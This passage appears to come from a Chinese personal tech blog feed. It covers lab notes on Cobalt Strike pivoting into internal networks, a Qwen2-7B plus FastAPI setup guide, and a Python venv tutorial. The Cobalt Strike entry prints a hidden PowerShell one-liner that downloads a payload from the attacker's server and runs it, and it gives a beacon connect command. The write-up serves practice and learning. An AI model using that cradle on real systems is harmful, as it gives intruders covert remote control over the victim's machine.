src="/../image/image-20241001200519982.png" alt="image-20241001200519982"></p><h2 id="cs多层内网上线"><a href="#cs多层内网上线" class="headerlink" title="cs多层内网上线"></a>cs多层内网上线</h2><p>cobalt strike 简称 cs,它作为 APT 攻击神器,APT长期是以攻击企业内网为主所以考虑到内网穿透。内网穿透方式，分为正向和反向，正向是可以直连内网主机，反向是让受害者反向连接。正向连接可以直接连接目标得到权限。下面是一个正向连接图。存在两个段 teamserver,不允许访问B，现在服务器上A有权限。可以通过cs的正向连接连接B</p><p><a href="https://www.cnblogs.com/smileleooo/p/18275805#:~:text=%E5%87%BA%E7%BD%91or%E4%B8%8D%E5%87%BA%E7%BD%91%EF%BC%9F%20%E7%9B%AE">https://www.cnblogs.com/smileleooo/p/18275805#:~:text=%E5%87%BA%E7%BD%91or%E4%B8%8D%E5%87%BA%E7%BD%91%EF%BC%9F%20%E7%9B%AE</a></p><h3 id="cs正向链接多层内网"><a href="#cs正向链接多层内网" class="headerlink" title="cs正向链接多层内网"></a>cs正向链接多层内网</h3><p><img src="/../image/image-20241001200721183.png" alt="image-20241001200721183"></p><p>首先A服务上已经有了cs的后门。通过后门查看网络信息发现存在10.10.10.0&#x2F;24因为网段 A是可以访问B 的 所以在 teammserver 通过A作为作为跳板可以访问B.</p><p>1.上线主机</p><p><img src="/../image/image-20241002143859668.png" alt="image-20241002143859668"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.174.160:80/a&#x27;))&quot;</span><br></pre></td></tr></table></figure><p>2.在win上执行该语句</p><p>回到攻击机里查看cs，发现主机上线</p><p><img src="/../image/image-20241002144143064.png" alt="image-20241002144143064"></p><p>但这里有点不一样，我的内网地址没读取到</p><p>3.生成监听器</p><p>选择beacon-tcp</p><p><img src="/../image/image-20241002144822820.png" alt="image-20241002144822820"></p><p>4.生成win server的后门</p><p><img src="/../image/image-20241002144956983.png" alt="image-20241002144956983"></p><p>在靶机上执行</p><p>4.连接内网环境</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">connect 10.10.10.153:4444</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241002145408659.png" alt="image-20241002145408659"></p><p>能连确实能连，但因为环境问题，所以没有什么效果，还是要再来一台机子模拟内网环境</p><p><img src="/../image/image-20241002151847848.png" alt="image-20241002151847848"></p><p>不懂为什么还是一样的效果，应该是环境没配好</p><h3 id="cs反向链接多层内网"><a href="#cs反向链接多层内网" class="headerlink" title="cs反向链接多层内网"></a>cs反向链接多层内网</h3><p>上面介绍到正向连接到多层内网，如果在B服务器上有防火墙进行拦截，那么正向连接就会连接失败。为了解决这一问题可以采用 cobalt strike 的反向连接。反向连接可以突破防火墙的拦截，因为是从服务器内部反向连接出站。以下是一个存在防火墙的反向连接teammserver 的图</p><p><img src="/../image/image-20241002153706238.png" alt="image-20241002153706238"></p><p>Teamserver通过A连接B是不允许的。因为有防火墙拦截，正向连接失败。怎么解决?可以用反向连接突破。</p><p>1.设置中转，在原有会话的基础上</p><p><img src="/../image/image-20241002191950594.png" alt="image-20241002191950594"></p><p>2.生成后门</p><p><img src="/../image/image-20241002192023647.png" alt="image-20241002192023647"></p><p>3.复制到目标主机上</p><p>到这里失败了，还是得解决最开始那个环境得问题，要想办法让cs识别到双网卡</p>]]></content>
      
      
      
        <tags>
            
            <tag> 隧道应用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qwen+Fastapi</title>
      <link href="/2024/09/28/qwen-Fastapi/"/>
      <url>/2024/09/28/qwen-Fastapi/</url>
      
        <content type="html"><![CDATA[<h1 id="qwen-Fastapi搭建本地知识库"><a href="#qwen-Fastapi搭建本地知识库" class="headerlink" title="qwen+Fastapi搭建本地知识库"></a>qwen+Fastapi搭建本地知识库</h1><p>参考链接：<a href="https://blog.csdn.net/xiaobing259/article/details/139998673">https://blog.csdn.net/xiaobing259/article/details/139998673</a></p><p> <a href="https://download.pytorch.org/whl/cu124/torch-2.4.1%2Bcu124-cp39-cp39-win_amd64.whl">https://download.pytorch.org/whl/cu124/torch-2.4.1%2Bcu124-cp39-cp39-win_amd64.whl</a></p><p><a href="https://pytorch.org/get-started/previous-versions/?spm=a2c6h.12873639.article-detail.13.281c5bdfwUad0k">https://pytorch.org/get-started/previous-versions/?spm=a2c6h.12873639.article-detail.13.281c5bdfwUad0k</a></p><p><a href="https://blog.csdn.net/qq_43874102/article/details/123164105?spm=a2c6h.12873639.article-detail.11.281c5bdfwUad0k">https://blog.csdn.net/qq_43874102/article/details/123164105?spm=a2c6h.12873639.article-detail.11.281c5bdfwUad0k</a></p><p><a href="https://www.bilibili.com/read/cv35427548/?jump_opus=1">https://www.bilibili.com/read/cv35427548/?jump_opus=1</a></p><p>内存不多，用这个qwen&#x2F;Qwen2-7B-Instruct，差不多20G，2.5要百G，没那么多内存。。。</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="创建虚环境"><a href="#创建虚环境" class="headerlink" title="创建虚环境"></a>创建虚环境</h3><p>正好前面补充了虚环境的知识，这里我们直接创建一个.qwen的虚环境</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m venv .qwen</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240928221426863.png" alt="image-20240928221426863"></p><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><p>下面我们下载一下需要用到的包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install fastapi==0.104.1 uvicorn==0.24.0.post1 requests==2.25.1 modelscope==1.11.0 transformers==4.41.0 streamlit==1.24.0 sentencepiece==0.1.99 accelerate==0.24.1 transformers_stream_generator==0.0.4</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240928221505464.png" alt="image-20240928221505464"></p><h3 id="模型下载"><a href="#模型下载" class="headerlink" title="模型下载"></a>模型下载</h3><p>这里用博主给的脚本，稍作修改即可，也可以用官网的教程下载<a href="https://modelscope.cn/models/Qwen/Qwen2-7B-Instruct/files">https://modelscope.cn/models/Qwen/Qwen2-7B-Instruct/files</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">modelscope download --model Qwen/Qwen2-7B-Instruct</span><br></pre></td></tr></table></figure><p>但这个不会把文件保存到当前目录，用脚本可以指定缓存目录<a href="https://www.onetts.com/wk/12439">使用参考</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> modelscope <span class="keyword">import</span> snapshot_download</span><br><span class="line"></span><br><span class="line"><span class="comment"># snapshot_download函数用于下载模型</span></span><br><span class="line">model_dir = snapshot_download(</span><br><span class="line">    <span class="string">&#x27;qwen/Qwen2-7B-Instruct&#x27;</span>,  <span class="comment"># 模型名称</span></span><br><span class="line">    cache_dir=<span class="string">&#x27;./autodl-tmp&#x27;</span>,  <span class="comment"># 缓存目录</span></span><br><span class="line">    revision=<span class="string">&#x27;master&#x27;</span>  <span class="comment"># 版本号</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>但不懂为什么下载会停住</p><p><img src="/../image/image-20240928222819389.png" alt="image-20240928222819389"></p><p>看了下任务管理器，pyton还是有占用网络资源的的</p><p><img src="/../image/image-20240928222917899.png" alt="image-20240928222917899"></p><p>等了一会，进度条动了，所以遇到这种情况可以等一等，可能是还没显示</p><p><img src="/../image/image-20240928223007931.png" alt="image-20240928223007931"></p><p>下载好后，大概有个15G左右</p><p><img src="/../image/image-20240928233227573.png" alt="image-20240928233227573"></p><h2 id="代码准备"><a href="#代码准备" class="headerlink" title="代码准备"></a>代码准备</h2><h3 id="安装fastapi库"><a href="#安装fastapi库" class="headerlink" title="安装fastapi库"></a>安装fastapi库</h3><p><a href="https://fastapi.org.cn/tutorial/first-steps/">https://fastapi.org.cn/tutorial/first-steps/</a></p><p>在<code>./autodl-tmp</code>路径下创建<code>fastapi_Demo.py</code>文件，编写FastAPI应用代码，用于加载模型并提供API服务</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding=&quot;utf-8&quot;</span></span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Request</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer, AutoModelForCausalLM, GenerationConfig</span><br><span class="line"><span class="keyword">import</span> uvicorn</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置设备参数</span></span><br><span class="line">DEVICE = <span class="string">&quot;cuda&quot;</span>  <span class="comment"># 使用CUDA</span></span><br><span class="line">DEVICE_ID = <span class="string">&quot;0&quot;</span>  <span class="comment"># CUDA设备ID，如果未设置则为空</span></span><br><span class="line">CUDA_DEVICE = <span class="string">f&quot;<span class="subst">&#123;DEVICE&#125;</span>:<span class="subst">&#123;DEVICE_ID&#125;</span>&quot;</span> <span class="keyword">if</span> DEVICE_ID <span class="keyword">else</span> DEVICE  <span class="comment"># 组合CUDA设备信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清理GPU内存函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">torch_gc</span>():</span><br><span class="line">    <span class="keyword">if</span> torch.cuda.is_available():  <span class="comment"># 检查是否可用CUDA</span></span><br><span class="line">        <span class="keyword">with</span> torch.cuda.device(CUDA_DEVICE):  <span class="comment"># 指定CUDA设备</span></span><br><span class="line">            torch.cuda.empty_cache()  <span class="comment"># 清空CUDA缓存</span></span><br><span class="line">            torch.cuda.ipc_collect()  <span class="comment"># 收集CUDA内存碎片</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建FastAPI应用</span></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理POST请求的端点</span></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">create_item</span>(<span class="params">request: Request</span>):</span><br><span class="line">    <span class="keyword">global</span> model, tokenizer  <span class="comment"># 声明全局变量以便在函数内部使用模型和分词器</span></span><br><span class="line">    json_post_raw = <span class="keyword">await</span> request.json()  <span class="comment"># 获取POST请求的JSON数据</span></span><br><span class="line">    json_post = json.dumps(json_post_raw)  <span class="comment"># 将JSON数据转换为字符串</span></span><br><span class="line">    json_post_list = json.loads(json_post)  <span class="comment"># 将字符串转换为Python对象</span></span><br><span class="line">    prompt = json_post_list.get(<span class="string">&#x27;prompt&#x27;</span>)  <span class="comment"># 获取请求中的提示</span></span><br><span class="line"></span><br><span class="line">    messages = [</span><br><span class="line">            &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;You are a helpful assistant.&quot;</span>&#125;,</span><br><span class="line">            &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: prompt&#125;</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 调用模型进行对话生成</span></span><br><span class="line">    input_ids = tokenizer.apply_chat_template(messages,tokenize=<span class="literal">False</span>,add_generation_prompt=<span class="literal">True</span>)</span><br><span class="line">    model_inputs = tokenizer([input_ids], return_tensors=<span class="string">&quot;pt&quot;</span>).to(<span class="string">&#x27;cuda&#x27;</span>)</span><br><span class="line">    generated_ids = model.generate(model_inputs.input_ids,max_new_tokens=<span class="number">512</span>)</span><br><span class="line">    generated_ids = [</span><br><span class="line">        output_ids[<span class="built_in">len</span>(input_ids):] <span class="keyword">for</span> input_ids, output_ids <span class="keyword">in</span> <span class="built_in">zip</span>(model_inputs.input_ids, generated_ids)</span><br><span class="line">    ]</span><br><span class="line">    response = tokenizer.batch_decode(generated_ids, skip_special_tokens=<span class="literal">True</span>)[<span class="number">0</span>]</span><br><span class="line">    now = datetime.datetime.now()  <span class="comment"># 获取当前时间</span></span><br><span class="line">    time = now.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)  <span class="comment"># 格式化时间为字符串</span></span><br><span class="line">    <span class="comment"># 构建响应JSON</span></span><br><span class="line">    answer = &#123;</span><br><span class="line">        <span class="string">&quot;response&quot;</span>: response,</span><br><span class="line">        <span class="string">&quot;status&quot;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="string">&quot;time&quot;</span>: time</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 构建日志信息</span></span><br><span class="line">    log = <span class="string">&quot;[&quot;</span> + time + <span class="string">&quot;] &quot;</span> + <span class="string">&#x27;&quot;, prompt:&quot;&#x27;</span> + prompt + <span class="string">&#x27;&quot;, response:&quot;&#x27;</span> + <span class="built_in">repr</span>(response) + <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(log)  <span class="comment"># 打印日志</span></span><br><span class="line">    torch_gc()  <span class="comment"># 执行GPU内存清理</span></span><br><span class="line">    <span class="keyword">return</span> answer  <span class="comment"># 返回响应</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 加载预训练的分词器和模型</span></span><br><span class="line">    model_name_or_path = <span class="string">&#x27;./qwen/Qwen2-7B-Instruct&#x27;</span></span><br><span class="line">    tokenizer = AutoTokenizer.from_pretrained(model_name_or_path, use_fast=<span class="literal">False</span>)</span><br><span class="line">    model = AutoModelForCausalLM.from_pretrained(model_name_or_path, device_map=<span class="string">&quot;auto&quot;</span>, torch_dtype=torch.bfloat16)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 启动FastAPI应用</span></span><br><span class="line">    <span class="comment"># 用6006端口可以将autodl的端口映射到本地，从而在本地使用api</span></span><br><span class="line">    uvicorn.run(app, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">6006</span>, workers=<span class="number">1</span>)  <span class="comment"># 在指定端口和主机上启动应用</span></span><br></pre></td></tr></table></figure><p>执行的时候可能会报错</p><h3 id="Errot"><a href="#Errot" class="headerlink" title="Errot"></a>Errot</h3><h4 id="AssertionError-Torch-not-compiled-with-CUDA-enabled"><a href="#AssertionError-Torch-not-compiled-with-CUDA-enabled" class="headerlink" title="AssertionError: Torch not compiled with CUDA enabled"></a>AssertionError: Torch not compiled with CUDA enabled</h4><p><a href="https://blog.csdn.net/moyong1572/article/details/119438286">https://blog.csdn.net/moyong1572/article/details/119438286</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="built_in">print</span>(torch.__version__)</span><br><span class="line"><span class="built_in">print</span>(torch.cuda.is_available())</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240929205938728.png" alt="image-20240929205938728"></p><p>False，说明当前的pytorch版本无法使用显卡，先安装cuda</p><ol><li>查看自己显卡驱动程序的版本</li></ol><p><img src="/../image/image-20240929210039119.png" alt="image-20240929210039119"></p><ol start="2"><li>下载对应的cuda</li></ol><p>查看需要下载的版本：<a href="https://docs.nvidia.com/cuda/cuda-toolkit-release-notes/index.html">https://docs.nvidia.com/cuda/cuda-toolkit-release-notes/index.html</a></p><p><img src="/../image/image-20240929210626909.png" alt="image-20240929210626909"></p><p>我们需要下载12.5的版本，但GA喝update有什么区别，搞不懂</p><p><a href="https://wenku.csdn.net/answer/f6694262edc811ed9e3dfa163eeb3507#:~:text=%E8%80%8C%E5%9C%A8CUDA%E4%B8%AD%EF%BC%8CGA">https://wenku.csdn.net/answer/f6694262edc811ed9e3dfa163eeb3507#:~:text=%E8%80%8C%E5%9C%A8CUDA%E4%B8%AD%EF%BC%8CGA</a></p><p>下载地址：<a href="https://developer.nvidia.com/cuda-toolkit-archive">https://developer.nvidia.com/cuda-toolkit-archive</a></p><p><img src="/../image/image-20240929210802209.png" alt="image-20240929210802209"></p><p>进入下载页面，选择对应的操作系统，中间有一步我选择local了，怕网络不好</p><p><img src="/../image/image-20240929210855880.png" alt="image-20240929210855880"></p><p>选完，这里会有对应的版本给你下载，这个下载指引挺有意思的</p><p><img src="/../image/image-20240929210948888.png" alt="image-20240929210948888"></p><p>下载好后就可以安装了：<a href="https://blog.csdn.net/weixin_34409703/article/details/93226830">https://blog.csdn.net/weixin_34409703/article/details/93226830</a></p><p>双击安装下载的.exe文件，然后选择解压路径，如下图，解压到哪里无所谓，安装成功会自动删除；</p><p><img src="/../image/image-20240929211712678.png" alt="image-20240929211712678"></p><p><img src="/../image/image-20240929211951860.png" alt="image-20240929211951860"></p><p>这里我先继续试试</p><p><img src="/../image/image-20240929212014051.png" alt="image-20240929212014051"></p><p>解压完成后，得到如下图：</p><ul><li>精简：安装所有CUDA模块，并覆盖掉当前的NVIDIA驱动程序；（说实话，容易出问题）</li><li>自定义：选择自己想要安装的模块，此处选择这里；</li></ul><p><img src="/../image/image-20240929212028303.png" alt="image-20240929212028303"></p><p>下面几个模块准确具体有什么用，不能100%确定，但能大概才出来：</p><ul><li>CUDA：这个是必须的，下面有CUDA Runntime、Samples一些东西；</li><li>NVIDIA GeForce Experience：这个好像是为了更好的游戏体验，之前安装显卡驱动程序时也提示是否安装，果断拒绝了；</li><li>Other components：这里的PhysX好像也是为了游戏体验来的；</li><li>Driver components：这个就要慎重了，<strong>意思就是重新安装显卡驱动程序</strong>；如果之前已经成功安装驱动程序，这里就不用选了；如果之前没安装驱动程序，<strong>建议还是去官网上单独下载驱动程序进行安装吧</strong></li></ul><p>根据这个，我也是只保留了第一个选项</p><p><img src="/../image/image-20240929212132253.png" alt="image-20240929212132253"></p><p><img src="/../image/image-20240929212141125.png" alt="image-20240929212141125"></p><p>这里我修改到其它路径了，而且这里我只有一个选项。。。</p><p><img src="/../image/image-20240929212610431.png" alt="image-20240929212610431"></p><p>安装完成后配置一下环境变量</p><p>将<code>F:/Nvida/lib/x64</code>添加的系统变量的path中；</p><p>然后nvcc -V即可</p><p><img src="/../image/image-20240929213109888.png" alt="image-20240929213109888"></p><ol start="3"><li>还需要安装对应的CuDNN</li></ol><p>下载网址 <a href="https://developer.nvidia.com/rdp/cudnn-archive">https://developer.nvidia.com/rdp/cudnn-archive</a></p><p>下载对应CUDA版本的CuDNN</p><p>下载完成后，解压得到一个名为cudnn-windows-x86_64-8.9.7.29_cuda12-archive的文件夹；</p><blockquote><p>该文件夹下的文件复制到上一步安装的CUDA中；注意对应的文件夹；<br>.&#x2F;cuda&#x2F;bin&#x2F;.dll 复制到 .&#x2F;NVIDIA GPU Computing Tookit&#x2F;CUDA&#x2F;v8.0&#x2F;bin&#x2F;<br>.&#x2F;cuda&#x2F;include&#x2F;.dll 复制到 .&#x2F;NVIDIA GPU Computing Tookit&#x2F;CUDA&#x2F;v8.0&#x2F;include&#x2F;<br>.&#x2F;cuda&#x2F;lib&#x2F;x64&#x2F;**.dll 复制到 .&#x2F;NVIDIA GPU Computing Tookit&#x2F;CUDA&#x2F;v8.0&#x2F;lib&#x2F;x64&#x2F;</p></blockquote><p>这里根据实际情况来操作，cudnn就是原来的扩充，直接把对应的动态链接库dll，要包含的头文件*.h和要用的lib库，给补充到原拉的cuda中即可</p><p>安装好后测试Pytorch是否可以使用，运行刚刚的检查脚本，还是False&#x2F;。。。</p><p>原文链接：<a href="https://blog.csdn.net/moyong1572/article/details/119438286">https://blog.csdn.net/moyong1572/article/details/119438286</a></p><p>还有一种情况也会发生错误<a href="https://so.csdn.net/so/search?q=Torch&spm=1001.2101.3001.7020">Torch</a> not compiled with CUDA enabled，那就是安装的pytorch是cpu版本。。。</p><p>访问链接：<a href="https://pytorch.org/get-started/locally/#supported-windows-distributions%EF%BC%8C%E9%80%89%E6%8B%A9%E7%9B%B8%E5%BA%94%E7%9A%84%E7%89%88%E6%9C%AC">https://pytorch.org/get-started/locally/#supported-windows-distributions，选择相应的版本</a></p><p><img src="/../image/image-20240929220037638.png" alt="image-20240929220037638"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu124</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240929220306521.png" alt="image-20240929220306521"></p><p>有点大啊，我看看能不能手动安装，复制下载链接，IDM+手动设置代理</p><p><img src="/../image/image-20240929220903447.png" alt="image-20240929220903447"></p><p>确实快的多，下载完放到相应的位置即可，就是大小有点对不上，他的2.5应该值得是解压后的，whl是一个压缩文件，下载好后，给他放到虚环境下的.&#x2F;qwen&#x2F;Lib&#x2F;site-packages,然后再pip一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install F:\qwen\.qwen\lib\site-packages\torch-2.4.1+cu124-cp39-cp39-win_amd64.whl</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240929221803376.png" alt="image-20240929221803376"></p><h5 id="测试是否安装成功"><a href="#测试是否安装成功" class="headerlink" title="测试是否安装成功"></a>测试是否安装成功</h5><p><img src="/../image/image-20240929222109947.png" alt="image-20240929222109947"></p><p>但还是有问题</p><p><img src="/../image/image-20240929224415158.png" alt="image-20240929224415158"></p><p>感觉靠谱i的解释如下，但这个慢点，好像慢的有点多</p><p><img src="/../image/image-20240929224520750.png" alt="image-20240929224520750"></p><p><img src="/../image/image-20240929225706044.png" alt="image-20240929225706044"></p><p>我试着换个版本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://download.pytorch.org/whl/cu121/torch-2.1.2%2Bcu121-cp39-cp39-win_amd64.whl</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240929231604190.png" alt="image-20240929231604190"></p><p>这次也是挺慢的，但没有报错了</p><p><img src="/../image/image-20240929233328129.png" alt="image-20240929233328129"></p><p><img src="/../image/image-20240929225304370.png" alt="image-20240929225304370"></p><p>这个错误，DEVICE_ID得设置成0，<a href="https://blog.csdn.net/qq_38614074/article/details/139499410#:~:text=RuntimeErr">https://blog.csdn.net/qq_38614074/article/details/139499410#:~:text=RuntimeErr</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python虚环境</title>
      <link href="/2024/09/26/Python%E8%99%9A%E7%8E%AF%E5%A2%83/"/>
      <url>/2024/09/26/Python%E8%99%9A%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h1 id="Python虚环境"><a href="#Python虚环境" class="headerlink" title="Python虚环境"></a>Python虚环境</h1><h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>在平时的学习中，需要用到python语言写的不同的工具，这些工具大都需要安装requirement.txt中要求的版本的库，有时候不同的工具要求的库的版本不同时，需要来回切换，有些还需要切换python的版本，所以我们需要一个办法来应对这种情况，python虚环境（venv）就是一个不错的解决方法</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>看了许多文章视频，我按自己吸收到的经验排序来给出链接：</p><p><a href="https://www.bilibili.com/video/BV1V7411n7CM?p=6&amp;vd_source=3ae03810e5d4ba6e6b93c5edd6c76912">https://www.bilibili.com/video/BV1V7411n7CM?p=6&amp;vd_source=3ae03810e5d4ba6e6b93c5edd6c76912</a></p><p><a href="https://www.bilibili.com/video/BV1oQ4y1n7sx/?spm_id_from=333.788&amp;vd_source=3ae03810e5d4ba6e6b93c5edd6c76912">https://www.bilibili.com/video/BV1oQ4y1n7sx/?spm_id_from=333.788&amp;vd_source=3ae03810e5d4ba6e6b93c5edd6c76912</a></p><p><a href="https://blog.csdn.net/weixin_47520540/article/details/133614562#:~:text=%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E5%8C%BA%E5%88%AB">https://blog.csdn.net/weixin_47520540/article/details/133614562#:~:text=%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E5%8C%BA%E5%88%AB</a>.</p><p>（venv，conda，pipenv，poetry）<a href="https://blog.csdn.net/qq_42951560/article/details/124224972">https://blog.csdn.net/qq_42951560/article/details/124224972</a></p><p><a href="https://www.cnblogs.com/doublexi/p/15791048.html">https://www.cnblogs.com/doublexi/p/15791048.html</a></p><p>（anaconda同样是一个不错的管理工具，推荐miniconda，anaconda比较臃肿，如果不是做科学计算等相关工作，用miniconda即可）<a href="https://www.cnblogs.com/doublexi/p/15796263.html">https://www.cnblogs.com/doublexi/p/15796263.html</a></p><p><a href="https://blog.csdn.net/ming12131342/article/details/140233867">https://blog.csdn.net/ming12131342/article/details/140233867</a></p><p>（pipx好像也不错）<a href="https://blog.csdn.net/pythondh1/article/details/139227698">https://blog.csdn.net/pythondh1/article/details/139227698</a></p><h2 id="介绍venv"><a href="#介绍venv" class="headerlink" title="介绍venv"></a>介绍venv</h2><h3 id="什么是环境"><a href="#什么是环境" class="headerlink" title="什么是环境"></a>什么是环境</h3><p><img src="/../image/image-20240927100237926.png" alt="image-20240927100237926"></p><p>这是一个python环境（主要的结构），而虚拟环境就是一个环境的副本，如果每次复制都要连标准库和第三方的库一起复制一次的话，会导致内存资源的浪费，且不方便管理，所以创建一个虚环境，只包含你（开始是有个默认的pip）的第三方库。而且是不包含标准库的，直接引用原来的标准库就行,然后在虚环境有自带的pip.exe直接执行就行，不用指定路径什么的。</p><p>下面来举个例子用一下试试，打开命令行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt;python -m venv -h</span><br><span class="line">usage: venv [-h] [--system-site-packages] [--symlinks | --copies] [--clear] [--upgrade] [--without-pip]</span><br><span class="line">            [--prompt PROMPT] [--upgrade-deps]</span><br><span class="line">            ENV_DIR [ENV_DIR ...]</span><br><span class="line"></span><br><span class="line">Creates virtual Python environments in one or more target directories.</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  ENV_DIR               A directory to create the environment in.</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  --system-site-packages</span><br><span class="line">                        Give the virtual environment access to the system site-packages dir.</span><br><span class="line">  --symlinks            Try to use symlinks rather than copies, when symlinks are not the default for the platform.</span><br><span class="line">  --copies              Try to use copies rather than symlinks, even when symlinks are the default for the platform.</span><br><span class="line">  --clear               Delete the contents of the environment directory if it already exists, before environment</span><br><span class="line">                        creation.</span><br><span class="line">  --upgrade             Upgrade the environment directory to use this version of Python, assuming Python has been</span><br><span class="line">                        upgraded in-place.</span><br><span class="line">  --without-pip         Skips installing or upgrading pip in the virtual environment (pip is bootstrapped by default)</span><br><span class="line">  --prompt PROMPT       Provides an alternative prompt prefix for this environment.</span><br><span class="line">  --upgrade-deps        Upgrade core dependencies: pip setuptools to the latest version in PyPI</span><br><span class="line"></span><br><span class="line">Once an environment has been created, you may wish to activate it, e.g. by sourcing an activate script in its bin</span><br><span class="line">directory.</span><br></pre></td></tr></table></figure><p>绝大多数情况下是默认参数即可，偶尔用到system-site-packages，因为有时候你需要用到原来的第三方库，再安装可能太费时了，用这个参数就能引用原来的库了，下面我们来创建一个虚环境试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m venv venvdemo</span><br></pre></td></tr></table></figure><p>venvdemo是我创建的环境的文件夹的名字（<em>在大多数工具自己生成的环境目录 ，都是隐藏文件夹也就是带个点的如：.venv</em>）。</p><p><img src="/../image/image-20240927105303844.png" alt="image-20240927105303844"></p><p>创建完成后我们可以看到生成了这些文件，下面来看看这些文件的内容</p><p><strong>Include</strong>空的</p><p><strong>Lib</strong>：只有一个site-packages，然后里面是一些默认的安装工具</p><p><img src="/../image/image-20240927105650070.png" alt="image-20240927105650070"></p><p><strong>Scripts</strong>：有启动虚环境的脚本（多版本，linux的，cmd的，powershell的），还有默认的python和pip的执行文件</p><p><img src="/../image/image-20240927105747811.png" alt="image-20240927105747811"></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>因为是在cmd窗口，我们执行bat文件，进入虚环境</p><p><img src="/../image/image-20240927110057945.png" alt="image-20240927110057945"></p><p>使用和平时的python没区别，主要是环境路径的不同，我们可以打印下路径看看</p><p><img src="/../image/image-20240927111041062.png" alt="image-20240927111041062"></p><p>和原来的差别就是第三方库的位置变了，也就是改变环境变量</p><p><img src="/../image/image-20240927111323864.png" alt="image-20240927111323864"></p><p>可以看到path中多了一个venvdemo的环境，而且在最前面，就相当于截胡了原来的环境</p><h3 id="必要性"><a href="#必要性" class="headerlink" title="必要性"></a>必要性</h3><p>以安装django为例，先在虚环境安装一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install django </span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240927111916930.png" alt="image-20240927111916930"></p><p>可以看到安装django不只安装了一个包，这些包之间都是存在版本依赖的，改变了可能导致django用不了，各种冲突报错。而且我们只是安装了django其它的是附带的，到时候排错也不好排，而且卸载django时，他是只卸载django，其它的他是不会卸载的，这是我们安装django后的pip  list</p><p><img src="/../image/image-20240927112228116.png" alt="image-20240927112228116"></p><p>给它卸载了再看看</p><p><img src="/../image/image-20240927112247515.png" alt="image-20240927112247515"></p><p>可以看到除了django其它都在，所以如果不控制包的范围，到时候管理起来特别麻烦。</p><h3 id="保存和复制"><a href="#保存和复制" class="headerlink" 